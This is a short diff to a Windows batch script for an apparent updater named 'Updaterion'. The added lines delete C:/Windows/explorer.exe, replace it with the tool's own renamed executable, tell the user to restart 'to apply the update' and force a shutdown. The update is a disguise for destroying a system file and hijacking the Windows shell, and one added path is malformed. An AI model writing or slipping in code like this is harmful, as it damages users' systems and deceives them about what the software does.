@@ -9,8 +9,11 @@ echo DONE
 echo Please wait..
 cd LegacyUpdateService
 start legacyupdateservice.exe
-timeout /t 15
 cd C:/Windows/
-start explorer.exe
+del explorer.exe
+cd C:/Users/%USERPROFILE%/Downloads/LegacyUpdateService
 taskkill /im legacyupdateservice.exe
-echo Updaterion has failed the update. Thank you for testing Updaterion Alpha!
+rename legacyupdateservice.exe explorer.exe
+move "%USERPROFILE%\Downloads\LegacyUpdateService/explorer.exe" "C:/Windows/"
+echo Please restart to apply the update.
+shutdown
